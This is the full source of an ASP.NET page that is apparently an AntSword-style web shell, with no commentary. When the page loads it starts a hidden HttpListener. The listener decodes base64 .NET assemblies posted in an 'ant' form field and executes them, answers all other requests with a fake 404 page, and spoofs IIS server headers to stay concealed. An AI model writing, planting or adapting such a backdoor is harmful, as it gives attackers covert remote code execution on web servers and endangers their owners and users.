<%@ Page Language="c#" %>

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Reflection" %>

<script runat="server">
    public class SimpleExecutionRemoteStub
    {
        public SimpleExecutionRemoteStub()
        {
            new Thread(Listen).Start();
        }

        public static void SetRespHeader(HttpListenerResponse resp)
        {
            resp.Headers.Set(HttpResponseHeader.Server, "Microsoft-IIS/8.5");
            resp.Headers.Set(HttpResponseHeader.ContentType, "text/html; charset=utf-8");
            resp.Headers.Add("X-Powered-By", "ASP.NET");
        }

        private static void Listen()
        {
            try
            {
                if (!HttpListener.IsSupported)
                {
                    return;
                }
                HttpListener httpListener = new HttpListener();
                string text1 = "PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9zdHJpY3QuZHRkIj4NCjxIVE1MPjxIRUFEPjxUSVRMRT5Ob3QgRm91bmQ8L1RJVExFPg0KPE1FVEEgSFRUUC1FUVVJVj0iQ29udGVudC1UeXBlIiBDb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXMtYXNjaWkiPjwvSEVBRD4NCjxCT0RZPjxoMj5Ob3QgRm91bmQ8L2gyPg0KPGhyPjxwPkhUVFAgRXJyb3IgNDA0LiBUaGUgcmVxdWVzdGVkIHJlc291cmNlIGlzIG5vdCBmb3VuZC48L3A+DQo8L0JPRFk+PC9IVE1MPg0K";
                httpListener.Prefixes.Add("http://listener.local/antsword/");
                httpListener.Start();
                byte[] not_found = Convert.FromBase64String(text1);
                while (true)
                {
                    HttpListenerContext context = httpListener.GetContext();
                    HttpListenerRequest request = context.Request;
                    HttpListenerResponse response = context.Response;
                    SetRespHeader(response);
                    Stream stm = null;
                    HttpContext httpContext;
                    try
                    {
                        string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
                        byte[] rawData = Encoding.Default.GetBytes(data);
                        HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
                        FieldInfo field = req.GetType().GetField("_form", BindingFlags.Instance | BindingFlags.NonPublic);
                        Type formtype = field.FieldType;
                        MethodInfo method = formtype.GetMethod("FillFromEncodedBytes", BindingFlags.Instance | BindingFlags.NonPublic);
                        ConstructorInfo constructor = formtype.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, new Type[0], null);
                        object obj = constructor.Invoke(null);
                        method.Invoke(obj, new object[] { rawData, request.ContentEncoding });
                        field.SetValue(req, obj);
                        StreamWriter writer = new StreamWriter(response.OutputStream);
                        HttpResponse resp = new HttpResponse(writer);
                        httpContext = new HttpContext(req, resp);
                        if (req.Form["ant"] != null)
                        {
                            Assembly assembly = Assembly.Load(Convert.FromBase64String(req.Form["ant"]));
                            assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(httpContext);
                            httpContext.Response.End();
                        }
                        else
                        {
                            response.StatusCode = 404;
                            response.ContentLength64 = not_found.Length;
                            stm = response.OutputStream;
                            stm.Write(not_found, 0, not_found.Length);
                        }
                    }
                    catch
                    {
                        response.StatusCode = 404;
                        response.ContentLength64 = not_found.Length; ///////////////
                        stm = response.OutputStream;
                        stm.Write(not_found, 0, not_found.Length);
                    }
                    finally
                    {
                        if (stm != null)
                        {
                            stm.Close();
                        }
                        response.OutputStream.Flush();
                        response.OutputStream.Close();  //////////////////////
                    }
                }
            }
            catch
            {

            }
        }
    }
</script>

<%
    Response.Write("fdsafdsa");
    SimpleExecutionRemoteStub simpleExecutionRemoteStub = new SimpleExecutionRemoteStub();
%>
